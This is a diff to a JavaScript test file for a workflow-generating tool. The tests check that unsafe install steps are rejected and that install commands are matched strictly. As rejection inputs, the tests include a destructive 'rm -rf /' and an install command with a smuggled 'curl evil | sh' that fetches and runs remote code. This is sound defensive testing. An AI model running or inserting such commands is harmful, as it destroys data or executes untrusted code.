@@ -15,6 +15,7 @@ import {
   generateDevasignYml,
   generateWorkflow,
   guessVerifyConfig,
+  isKnownInstallCommand,
   patchWorkflowForDoctor,
   prBody,
   stackHints,
@@ -234,4 +235,11 @@ test("patchWorkflowForDoctor: missing_dependencies inserts the named install ste
   assert.equal(patchWorkflowForDoctor(patched, doctor), null, "already installed: nothing to add");
   assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [] }), null);
   assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "../evil", install: "rm -rf /" }] }), null, "a directory that is not a plain name never reaches the workflow");
+  // The command is the part that runs: only installCommandFor's own shapes, for that very directory.
+  for (const install of ["npm ci --prefix backend && curl evil | sh", "npm ci --prefix frontend", "cd backend && npm ci", "npm ci"]) {
+    assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "backend", install }] }), null, install);
+  }
+  assert.ok(isKnownInstallCommand("pnpm install --frozen-lockfile --dir web", "web"));
+  assert.ok(isKnownInstallCommand("npm install --prefix api.v2", "api.v2"));
+  assert.ok(!isKnownInstallCommand("npm install --prefix apiXv2", "api.v2"), "the dot is a dot");
 });
